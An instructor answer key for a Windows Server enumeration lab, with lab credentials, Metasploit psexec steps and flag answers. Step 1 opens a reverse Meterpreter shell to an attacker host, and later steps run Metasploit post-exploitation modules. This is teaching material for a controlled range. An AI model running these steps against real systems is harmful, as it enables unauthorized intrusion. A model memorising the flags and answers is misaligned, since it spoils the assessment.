---
id: B03.M02.lab-1.2-answer-key
title: Lab 1.2 Answer Key
artifact_type: answer_key
audience: instructor
block: B03
legacy_aliases:
- week3_repo/docs/assessment/lab-1.2-answer-key.md
- B04.M13
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: course_internal
---
# Lab 1.2 — Windows Server — Answer Key (Instructor Only)

Use this as a live walkthrough. The goal is to start with only the access and tasking given to students, enumerate the host with standard Windows tools, and naturally uncover all five flags plus the required artifact answers.

Instructor intent: demonstrate at least two evidence paths where practical (native host commands and Metasploit modules), so students see repeatable collection methods instead of answers based on prior knowledge of the build.

Walkthrough commands are the **B03.M01 Situational Awareness, Execution Environments, and User Context** lecture SA baseline, not a closed list from the student packet. The packet is task-level. For additional enumeration commands, use that lecture, ATT&CK Discovery (TA0007), and Microsoft Learn. Do not treat this key as the only valid command set.

## Access

| Hostname (expected) | IP address    | Username | Password         | Connection |
| ------------------- | ------------- | -------- | ---------------- | ---------- |
| `bull-12`           | `20.30.40.12` | `badguy` | `1qaz2wsx!QAZ@WSX` | `psexec`   |

If the instructor or range card provides a different login, use those assigned values.

## Flag Reference

| Flag ID        | Default location in the default build                                                                          | Hiera key                              | Default value (if key omitted) |
| -------------- | -------------------------------------------------------------------------------------------------------------- | -------------------------------------- | ------------------------------ |
| `process_flag` | Scheduled task action/arguments for `CS_OPS_Backup` and, when active, the PowerShell task process command line | `cs_ops::lab_1_2::flags::process_flag` | `BRAVO-EMBER`                  |
| `log_flag`     | `C:\ProgramData\cs_ops\logs\app.log` (pivot from a running PowerShell command line with `-AppLogPath`)        | `cs_ops::lab_1_2::flags::log_flag`     | `POLAR-CIPHER`                 |
| `user_flag`    | `svc_backup` local user description and `C:\Users\svc_backup\Desktop\flag.txt`                                 | `cs_ops::lab_1_2::flags::user_flag`    | `NIMBUS-KEYSTONE`              |
| `port_flag`    | IIS HTTP response header `X-Backend-Service` on port `80` (set in `applicationHost.config` under `<location path="Default Web Site">`) | `cs_ops::lab_1_2::flags::port_flag`    | `TIDAL-ROUTE`                  |
| `config_flag`  | `connection_secret` in `C:\inetpub\wwwroot\db_config.txt`                                                      | `cs_ops::lab_1_2::flags::config_flag`  | `OPAL-MATRIX`                  |

Set each flag under `cs_ops::lab_1_2::flags` in Hiera, for example in `environments/week3_repo/vms/puppet/data/nodes/lab_1_2.yaml`. Defaults are defined in `environments/week3_repo/vms/puppet/modules/cs_ops/manifests/lab_1_2.pp`.

Relevant HTTP-header tunable:

- `cs_ops::lab_1_2::port_flag_header_name` defaults to `X-Backend-Service`. The header is configured at the IIS server-level config file (`C:\Windows\System32\inetsrv\config\applicationHost.config`) under a `<location path="Default Web Site">` block and is served on the externally reachable IIS site. The flag is recovered from HTTP response metadata; nothing in `C:\inetpub\wwwroot` carries it.

## Recommended Instructor Walkthrough

### 1. Gain initial access and establish situational awareness

From the Kali ops VM, use Metasploit to land a Meterpreter session with the Access-table `badguy` credentials (or range-rotated values if assigned):

```text
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser badguy
set SMBPass 1qaz2wsx!QAZ@WSX
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
```

Start inside the Meterpreter session and collect host/session baseline context before chasing any flag:

```text
sysinfo
getuid
getpid
shell
# Drops you into a local Windows cmd.exe shell for CLI commands.
hostname
whoami
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
time /t
date /t
net user
tasklist
netstat -ano
powershell -NoProfile
# Spawns PowerShell for PowerShell cmdlets.
Get-Date
$env:ComSpec
[Environment]::GetEnvironmentVariables('Process').GetEnumerator() | Sort-Object Name | Select-Object -First 20
Get-CimInstance Win32_Process -Filter "ProcessId=$PID" | Select-Object ProcessId,ParentProcessId,Name,CommandLine
Get-NetTCPConnection -State Listen,Established | Select-Object -First 40 LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess
Get-NetUDPEndpoint | Select-Object -First 40 LocalAddress,LocalPort,OwningProcess
```

Why:

- This is the B03.M01 Windows SA first pass after the assigned `psexec` path: host orientation before chasing artifacts.
- It anchors remote time, host identity, user/token context, shell/interpreter context, environment details, OS version, active users, process baseline, and listening/established TCP/UDP sockets.
- Equivalent commands from the lecture, ATT&CK Discovery, or Microsoft Learn are valid if they prove the same baseline.

What to call out:

- `getuid`, `whoami`, and `whoami /all` establish whether the session is running with the expected token and privileges.
- Meterpreter `shell` drops the session into a local `cmd.exe` for Windows CLI commands (`hostname`, `tasklist`, `netstat`). `powershell -NoProfile` then spawns PowerShell for cmdlets; `-NoProfile` skips profile scripts so the interpreter starts clean.
- `getpid` plus `Get-CimInstance Win32_Process -Filter "ProcessId=$PID"` ties the current PowerShell shell back to process evidence.
- The initial `tasklist`, `net user`, and socket output are not final answers; they are the map students use to decide where to investigate next.

### 2. Investigate processes and scheduled tasks to recover the process flag

Start broad with running processes:

```powershell
tasklist
Get-Process | Sort-Object ProcessName
Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine
Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*-AppLogPath*' -or $_.CommandLine -like '*-ProcessFlag*' } | Select-Object ProcessId, Name, CommandLine
```

Why:

- `tasklist` provides the broad classic Windows snapshot students are expected to know.
- `Get-Process` gives cleaner PowerShell output for discussion and filtering.
- Full command-line review exposes high-value pivots such as `-AppLogPath` and, if the repeating task is active, `-ProcessFlag`.

Expected process findings:

- Standard Windows service processes will dominate the list.
- If the repeating scheduled task happens to be active, students may catch `powershell.exe` spawned by the custom task, but they should not rely on timing alone.
- There should be a long-running PowerShell process whose command line includes `-AppLogPath`; hold this log pivot for the next step.

Then review scheduled tasks:

```text
schtasks /query /fo LIST /v
schtasks /query /fo LIST
# /v is useful for details, but with many tasks it can blow the buffer or be too much to process.
# Review names first, then pick one to inspect.
schtasks /query /tn CS_OPS_Backup /fo LIST /v
Get-ScheduledTask -TaskName CS_OPS_Backup | Format-List *
Get-ScheduledTask -TaskName CS_OPS_Backup | Select-Object -ExpandProperty Actions
```

Why:

- The student packet tasks scheduled-task review. `schtasks` and `Get-ScheduledTask` are the B03.M01 / standard Windows admin tools, not packet-named binaries. Additional task-query options are in Microsoft Learn.
- This is the Windows analogue to reading the Linux cron file in Lab 1.1.
- `schtasks /query` lists registered tasks. `/fo LIST` prints one field per line instead of a wide table. `/v` adds verbose fields (trigger, run-as user, Task To Run). `/tn` selects one task name.
- Students know the `CS_OPS_Backup` task name from the non-`/v` `schtasks /query /fo LIST` name review; the targeted `/tn` and `Get-ScheduledTask` commands are the evidence-backed narrowing step after that list, not after drowning in a full verbose dump.

Expected scheduled-task findings:

- There is a custom task named `CS_OPS_Backup`.
- It runs as `SYSTEM`.
- It launches PowerShell with a `-ProcessFlag` argument that contains the process flag.
- Its `-TaskLogPath` points to the task runtime report log; this path supports the next log-review step but is not the default `log_flag` source.
- The trigger is daily starting at `00:00`, repeating every `5` minutes for `480` minutes by default.

Expected task action excerpt:

```text
-NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\cs_ops\scripts\Invoke-CsOpsBackup.ps1" -ProcessFlag "BRAVO-EMBER" -TaskLogPath "C:\ProgramData\Microsoft\Windows\Backup\Reports\WindowsBackup.log"
```

Flag recovered:

- `process_flag` = `BRAVO-EMBER` by default.

Teaching point:

- Process enumeration on Windows is not only `tasklist`; it also includes the scheduled-task definitions that create those processes and expose task-specific artifacts.

Metasploit module options:

```text
background
use post/windows/gather/enum_services
set SESSION <meterpreter_session_id>
run

use post/windows/gather/enum_files
set SESSION <meterpreter_session_id>
set SEARCH_FROM C:\\Windows\\System32\\Tasks
set FILE_GLOBS CS_OPS_Backup
run
loot
```

Why:

- `enum_services` gives framework-driven service/process context to compare with `tasklist` and `Get-Process`.
- The scheduled task definition file is an artifact that can be collected directly through a `post` module.
- Reviewing the collected task file provides an alternate way to recover the PowerShell action arguments, including `-ProcessFlag`.

### 3. Follow log evidence and recover the log flag

Use the process and scheduled-task evidence from Step 2 to inspect related logs. Copy quoted paths from `schtasks` / `wmic` output; do not parse them with regex.

```text
wmic process get ProcessId,Name,CommandLine /format:list
dir C:\ProgramData
dir C:\ProgramData\cs_ops\logs
type C:\ProgramData\cs_ops\logs\app.log
```

Optional, after Step 2 already printed `-TaskLogPath` on the `CS_OPS_Backup` action:

```text
type "C:\ProgramData\Microsoft\Windows\Backup\Reports\WindowsBackup.log"
```

Why:

- `wmic` is Windows Management Instrumentation Command-line. `process` is the `Win32_Process` alias. `get ProcessId,Name,CommandLine` limits the dump to identity plus the command line. Default table output wraps long command lines; `/format:list` prints one field per line so quoted paths are readable.
- Step 2 command lines already showed `-AppLogPath` and a `-File` path under `C:\ProgramData\...`, so listing `C:\ProgramData` then `cs_ops\logs` is the Lab 1.1 analogue before `type`.
- The long-running PowerShell process exposes `-AppLogPath`, which is the default flag-bearing application log path.
- This keeps the log flag tied to evidence from process and scheduled-task review rather than a pre-announced path or a scripted string parse.

Expected task-log findings (from Step 2 Task To Run / `-TaskLogPath`, optional `type` above):

- The task log is located at `C:\ProgramData\Microsoft\Windows\Backup\Reports\WindowsBackup.log` by default.
- The task log confirms that the scheduled backup-style task executes and receives the process flag argument.

Expected optional `type` excerpt for the task log:

```text
Windows backup report initialized
[<timestamp>] Backup task executed by SYSTEM. Process flag supplied: BRAVO-EMBER
```

Expected app-log findings:

- The app log entry includes the log flag.
- The relevant user named in the entry is `svc_backup`; use that account name in Step 4.
- The application log directory does not contain the scheduled-task runtime log; the two paths are separate evidence sources.

Expected `type C:\ProgramData\cs_ops\logs\app.log` output starts with:

```text
[2024-01-15 12:00:00] Backup completed by svc_backup. POLAR-CIPHER
```

Flag recovered:

- `log_flag` = `POLAR-CIPHER` by default.

Artifact answer:

- The user associated with the log entry is `svc_backup`.

Metasploit module option:

```text
background
use post/windows/gather/enum_files
set SESSION <meterpreter_session_id>
set SEARCH_FROM <discovered_app_log_parent_dir>
set FILE_GLOBS *.log
run
loot
```

Why:

- The log collection module demonstrates collection of artifacts discovered from process command-line evidence.

### 4. Enumerate users and recover the user flag

Use the `svc_backup` name discovered in the app log as the transition into account review:

```text
net user
net user svc_backup
dir C:\Users
dir C:\Users\svc_backup
dir C:\Users\svc_backup\Desktop
type C:\Users\svc_backup\Desktop\flag.txt
```

Why:

- The student packet tasks local-user and user-artifact mapping. Stay in `cmd.exe`. `net user` is the B03.M01 / standard Windows starting point; additional account tools are in Microsoft Learn.
- `net user` lists local accounts. `net user svc_backup` prints that account’s **Comment/Description**, which is where the user flag is embedded by default. Students already ran `net user` in Step 1; this is the narrowing pass after the Step 3 log named `svc_backup`.
- Identify `svc_backup` in the full `net user` list before targeting it. Then `dir C:\Users` → `svc_backup` → `Desktop` and `type` the flag file. The profile walk is justified by the account name plus the `C:\Users` listing.

Expected findings:

- Local users should include the student access account plus service accounts such as `svc_backup` and `app_runner`.
- The `svc_backup` description includes the user flag in the default build.
- `C:\Users\svc_backup\Desktop\flag.txt` contains the same flag directly.

Expected `type C:\Users\svc_backup\Desktop\flag.txt` output:

```text
NIMBUS-KEYSTONE
```

Flag recovered:

- `user_flag` = `NIMBUS-KEYSTONE` by default.

Metasploit module options:

```text
background
use post/windows/gather/enum_logged_on_users
set SESSION <meterpreter_session_id>
run

use post/windows/gather/enum_files
set SESSION <meterpreter_session_id>
set SEARCH_FROM C:\\Users
set FILE_GLOBS flag.txt
run
loot
```

Why:

- `enum_logged_on_users` gives framework-collected user context to complement `net user`.
- `enum_files` provides a second path to recover `C:\Users\svc_backup\Desktop\flag.txt` when demonstrating repeatable file collection at scale.

### 5. Enumerate listeners and recover the config flag

Return to the network baseline and enumerate listeners:

```powershell
netstat -ano
Get-NetTCPConnection -State Listen | Sort-Object LocalPort | Format-Table -AutoSize
Get-NetUDPEndpoint | Sort-Object LocalPort | Format-Table -AutoSize
Get-Service W3SVC
Get-Process -Id (Get-NetTCPConnection -State Listen | Where-Object LocalPort -eq 80 | Select-Object -First 1 -ExpandProperty OwningProcess)
```

Why:

- `netstat -ano` and `Get-NetTCPConnection` are the B03.M01 Windows listener baseline. Equivalent socket commands from Microsoft Learn or ATT&CK Discovery are valid.
- Once students identify a listener on port `80`, they can justify investigating IIS and the web root.
- Correlating the port owner back to process/service evidence reinforces that port enumeration should connect to host purpose.

Expected listener findings:

- Port `80` is open for IIS in the default build.
- Other baseline Windows listeners such as `3389`, `5985`, and `445` may also be present, depending on the base image and range setup.

Investigate the web server and recover the config flag:

```text
curl.exe -I http://127.0.0.1/
dir C:\
dir C:\inetpub
dir C:\inetpub\wwwroot
type C:\inetpub\wwwroot\db_config.txt
curl.exe http://127.0.0.1/db_config.txt
```

Why:

- `curl.exe -I` sends an HTTP HEAD request. The `-I` option prints status and response headers only, which is enough to prove a web server is answering on `127.0.0.1` (`HTTP/1.1 200` and `Server: Microsoft-IIS/...`). Students stay in the existing `cmd.exe` shell; they do not need PowerShell for this.
- Listener evidence on port `80` plus that IIS `Server` header justifies walking `C:\` → `C:\inetpub` → `C:\inetpub\wwwroot` with `dir`, then `type` of the file that listing exposes. That is the Lab 1.1 analogue.
- `curl.exe -I` may already show `X-Backend-Service`. Do not treat that header as this step’s flag; it is Step 6. This step recovers `connection_secret` from disk (`type`) and from the same path over HTTP (`curl.exe` without `-I`).

Expected `type C:\inetpub\wwwroot\db_config.txt` / `curl.exe http://127.0.0.1/db_config.txt` output:

```text
# DB connection (assessment artifact)
db_host=localhost
db_user=cs_ops_app
connection_secret=OPAL-MATRIX
```

Expected config findings:

- The web root contains `db_config.txt`.
- The file contains a `connection_secret=` line.
- That value is the config flag.

Flag recovered:

- `config_flag` = `OPAL-MATRIX` by default.

Metasploit module options:

```text
background
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target_ip>
set RPORT 80
run

use post/windows/gather/enum_files
set SESSION <meterpreter_session_id>
set SEARCH_FROM C:\\inetpub\\wwwroot
set FILE_GLOBS db_config.txt
run
loot
```

Why:

- `dir_scanner` demonstrates web-content discovery without assuming prior filename knowledge.
- `enum_files` then collects the discovered config file directly from disk as a second evidence path to `connection_secret`.

### 6. Look deeper into IIS response metadata and recover the port flag

Now inspect the web service beyond the web-root files:

```text
curl.exe -I http://127.0.0.1/
```

Why:

- Step 5 proved that IIS is listening and that `wwwroot` contains a config artifact. Re-run `curl.exe -I` (or re-read the Step 5 HEAD output) and this time treat the custom header as the objective.
- The default lab does not place the port flag in any file under `C:\inetpub\wwwroot`. Students need listener evidence on port `80`, then HTTP response-header inspection.

Expected `curl.exe -I http://127.0.0.1/` excerpt:

```text
HTTP/1.1 200 OK
X-Backend-Service: TIDAL-ROUTE
Server: Microsoft-IIS/...
```

Flag recovered:

- `port_flag` = `TIDAL-ROUTE` by default.

Teaching point:

- The default lab does not place the port flag in any file under `C:\inetpub\wwwroot`. Recover it from `curl.exe -I` response headers, then confirm the same value in `applicationHost.config` with `appcmd` / `findstr`. The IIS site is reachable on all interfaces, so local or remote HTTP collection both work; the flag value travels in response metadata either way.

Configuration-side discovery path:

```text
dir C:\Windows\System32\inetsrv
dir C:\Windows\System32\inetsrv\config
C:\Windows\System32\inetsrv\appcmd.exe list site
C:\Windows\System32\inetsrv\appcmd.exe list config "Default Web Site" /section:httpProtocol
type C:\Windows\System32\inetsrv\config\applicationHost.config | findstr "X-Backend-Service"
```

Why:

- Students who go beyond response inspection should still be able to identify where the header is configured.
- `dir` of `C:\Windows\System32\inetsrv` then `config` locates the IIS install and its server-level config tree. That path is not under `C:\inetpub\wwwroot`.
- `appcmd.exe` is the IIS command-line manager. `list site` names configured sites (the CMD equivalent of listing websites). `list config "Default Web Site" /section:httpProtocol` dumps the effective HTTP protocol section for that site, including custom headers.
- Students know the site name `Default Web Site` from `appcmd list site` and the header name `X-Backend-Service` from `curl.exe -I`. `findstr "X-Backend-Service"` filters `applicationHost.config` to the matching line; `type` is the full-file read if they want context around that line.
- The header is defined in `C:\Windows\System32\inetsrv\config\applicationHost.config` under a `<location path="Default Web Site">` block.

Expected `appcmd.exe list config "Default Web Site" /section:httpProtocol` excerpt:

```text
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="X-Backend-Service" value="TIDAL-ROUTE" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

Expected `findstr "X-Backend-Service"` excerpt:

```text
        <add name="X-Backend-Service" value="TIDAL-ROUTE" />
```

Metasploit module option:

```text
background
use auxiliary/scanner/http/http_version
set RHOSTS <target_ip>
set RPORT 80
run

use auxiliary/scanner/http/http_header
set RHOSTS <target_ip>
set RPORT 80
run
```

Why:

- `http_version` confirms an HTTP service on the discovered listener using a scanner module.
- `http_header` retrieves the response headers from the same target, which is the framework-driven equivalent of `curl.exe -I` for capturing the custom header that carries the port flag.

### 7. Identify the active Meterpreter/C2 connection

From the host shell:

```powershell
netstat -ano | findstr ESTABLISHED
Get-NetTCPConnection -State Established | Sort-Object LocalPort | Format-Table -AutoSize
```

In Meterpreter, match process ID context if needed:

```text
getpid
ps
```

Why:

- The student packet tasks live connections, not only listeners. `netstat` / `Get-NetTCPConnection` are the B03.M01 Windows follow-up after the listener pass.
- In this delivery, the key management path is the reverse Meterpreter channel back to the handler/team server.
- Correlating established sockets with process IDs is the easiest way to confirm which connection is tied to the active session.

Artifact answer:

- Grade the remote address/port against the actual handler/team-server endpoint used for the Meterpreter session in your environment.

Metasploit module option:

```text
background
use post/windows/gather/tcpnetstat
set SESSION <meterpreter_session_id>
run
```

Why:

- This produces session-associated TCP connection data through a `post` module.
- It provides an alternate evidence source for established connections before correlating back to handler infrastructure.

### 8. Close with the "what is this server?" summary

Students should be able to conclude that this is a standard Windows Server providing at least:

- Administrative services such as SMB, RDP, and/or WinRM depending on the deployed baseline
- An active reverse management/C2 session during the exercise
- IIS on port `80`
- A repeating `SYSTEM` scheduled task that resembles an operational backup job
- A flag-bearing application log and task runtime report discovered from process/task evidence
- Service accounts such as `svc_backup` and `app_runner`
- Operational artifacts in logs and web config files that are discoverable through normal host enumeration

That is the full-system picture the lab is trying to build: processes, scheduled tasks, logs, ports, web service evidence, users, files, and conclusions tied together into one coherent assessment.

## Troubleshooting and Confirmation

- If `psexec` / Meterpreter fails, confirm the ops VM, `RHOSTS`, a reachable `LHOST`, SMB/445, and Access-table credentials versus any range-rotated SMB values.
- If verbose `schtasks /query /fo LIST /v` is unreadable or truncated, list names first with `/fo LIST`, then inspect the custom task with `/tn`.
- If no process shows `-AppLogPath`, the repeating task may be idle. Recover `process_flag` from the scheduled-task action; use `-TaskLogPath` if printed, and still hunt the app log from process/task evidence.
- If `curl.exe -I` shows `X-Backend-Service` during the web-root step, that header is the port flag. Recover it in Step 6. The web-root step is `connection_secret` from `db_config.txt`.
- If recovered flag strings, task names, or header names differ from this key, grade the Hiera values for that run, not the defaults table.

## Artifact Answers

1. **Process / scheduled task:** The custom backup task `CS_OPS_Backup` runs as `SYSTEM`.
2. **Logs:** The log entry containing the log flag names `svc_backup`; the default flag-bearing app log is `C:\ProgramData\cs_ops\logs\app.log`.
3. **Listening ports:** Expect `80/tcp` for IIS in the default build. Other common baseline listeners may include `3389/tcp`, `5985/tcp`, and `445/tcp` depending on your Windows baseline and range configuration.
4. **Config artifact:** The `connection_secret` value is `OPAL-MATRIX` by default.
5. **Port flag:** The IIS custom response header `X-Backend-Service` contains `TIDAL-ROUTE` by default.
6. **Users:** Students should identify the student access account plus `svc_backup` and `app_runner` at minimum in the default build.
7. **Active connections:** The remote address/port should match the Meterpreter handler/team-server endpoint visible in the active reverse session.
8. **Scheduled task cadence:** By default, the custom task starts daily at `00:00` and repeats every `5` minutes for `480` minutes.

## Acceptable Answers

Accept equivalent correct answers for service names and port descriptions. For flags, require exact string matches unless the exercise instructions explicitly allow partial credit.
